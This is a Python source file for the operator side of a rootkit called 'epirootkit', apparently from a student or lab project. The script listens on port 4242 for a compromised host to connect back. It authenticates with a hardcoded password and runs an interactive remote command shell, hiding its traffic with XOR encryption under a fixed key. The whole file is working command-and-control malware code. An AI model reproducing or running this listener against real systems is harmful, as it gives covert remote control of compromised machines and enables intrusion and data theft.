import socket
import sys
import time

DEBUG = True
KEY = "epirootkit"
HOST = "0.0.0.0"
PORT = 4242

def xor_encrypt(data: bytes) -> bytes:
    """
    Implements the same XOR encryption as the kernel module:
    encrypted[i] = msg[i] ^ config.xor_key[i % strlen(config.xor_key)]
    """
    result = bytearray()
    key_bytes = KEY.encode('ascii')
    key_len = len(key_bytes)

    for i in range(len(data)):
        result.append(data[i] ^ key_bytes[i % key_len])
    return bytes(result)

def debug_print(msg: str, data: bytes = None):
    if DEBUG:
        print(f"[DEBUG] {msg}")
        if data:
            print(f"[DEBUG] Raw data: {data}")
            print(f"[DEBUG] Hex: {data.hex()}")
            try:
                print(f"[DEBUG] ASCII: {data.decode('ascii', errors='ignore')}")
            except:
                pass

def receive_until_eof(client, timeout=5):
    """Receive data until --EOF-- marker is found or timeout occurs"""
    client.settimeout(0.1)  # Short timeout for quick chunks
    start_time = time.time()
    response = bytearray()

    while time.time() - start_time < timeout:
        try:
            chunk = client.recv(2048)
            if not chunk:
                break
            response.extend(chunk)

            # Try to decode and check for EOF marker
            try:
                decrypted = xor_encrypt(response).decode('ascii', errors='ignore')
                if '--EOF--' in decrypted:
                    break
            except:
                pass

        except socket.timeout:
            continue
        except Exception as e:
            print(f"Error receiving data: {e}")
            break

    return bytes(response)

def handle_client(client):
    try:
        # Send encrypted password
        password = b"epirootkit\n"
        encrypted_pass = xor_encrypt(password)
        debug_print("Sending encrypted password", encrypted_pass)
        client.sendall(encrypted_pass)

        # Receive and decrypt auth response
        auth_response_encrypted = receive_until_eof(client)
        if not auth_response_encrypted:
            print("No response received")
            return

        auth_response = xor_encrypt(auth_response_encrypted)
        debug_print("Received encrypted auth response", auth_response_encrypted)
        debug_print("Decrypted auth response", auth_response)

        try:
            auth_text = auth_response.decode('ascii', errors='ignore')
            print("--- AUTH ---")
            print(auth_text.replace('--EOF--', '').strip())
            print("------------\n")

            if "FAIL" in auth_text:
                print("Authentication failed. Exiting.")
                return

        except UnicodeDecodeError:
            print("Warning: Received corrupted auth response")
            return

        # Interactive shell loop
        while True:
            try:
                cmd = input("rootkit> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    # Send encrypted exit command
                    encrypted_cmd = xor_encrypt(b"exit\n")
                    client.sendall(encrypted_cmd)
                    break

                # Send encrypted command
                cmd_bytes = (cmd + "\n").encode('ascii')
                encrypted_cmd = xor_encrypt(cmd_bytes)
                debug_print(f"Sending encrypted command: {cmd}", encrypted_cmd)
                client.sendall(encrypted_cmd)

                # Receive and decrypt response
                response_encrypted = receive_until_eof(client)
                if response_encrypted:
                    response = xor_encrypt(response_encrypted)
                    debug_print("Received encrypted response", response_encrypted)
                    debug_print("Decrypted response", response)

                    try:
                        response_text = response.decode('ascii', errors='ignore')
                        print(response_text.replace('--EOF--', '').strip())
                    except UnicodeDecodeError:
                        print("Warning: Received corrupted response")

            except KeyboardInterrupt:
                print("\nSending exit command...")
                encrypted_cmd = xor_encrypt(b"exit\n")
                client.sendall(encrypted_cmd)
                break
            except Exception as e:
                print(f"Error during command execution: {e}")
                break

    except Exception as e:
        print(f"Error handling client: {e}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, PORT))
            server.listen(1)
            print(f"[*] Waiting for connection on {HOST}:{PORT}...")

            while True:
                client, addr = server.accept()
                print(f"[+] Connection from {addr[0]}:{addr[1]}")
                handle_client(client)

        except KeyboardInterrupt:
            print("\nShutting down server...")
        except Exception as e:
            print(f"Server error: {e}")

if __name__ == "__main__":
    main()